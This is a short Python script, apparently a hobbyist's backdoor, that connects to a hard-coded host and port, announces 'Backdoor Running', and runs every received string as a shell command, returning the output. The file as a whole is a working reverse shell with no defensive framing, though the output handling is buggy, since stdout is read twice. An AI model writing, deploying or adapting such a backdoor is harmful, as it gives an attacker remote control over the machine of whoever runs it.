import socket as so
import subprocess as sb


Host = "192.168.2.60"
Port = 1337
s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((Host, Port))
s.send(b"Backdoor Running")
while True:
    data = s.recv(256)
    print(data.decode("utf-8"))
    data = data.decode("utf-8")
    process = sb.Popen(str(data), shell=True, stdout=sb.PIPE, stdin=sb.PIPE, stderr=sb.PIPE)
    print(process.stderr.read())
    print(process.stdout.read().decode("utf-8"))
    stdout = process.stdout.read()
    print(type(stdout))
    # if stdout is not b'':
        # if data is not "cd..":
    s.send(stdout)
    # else:
    #     print("hi")
    #     s.send(process.stderr.read())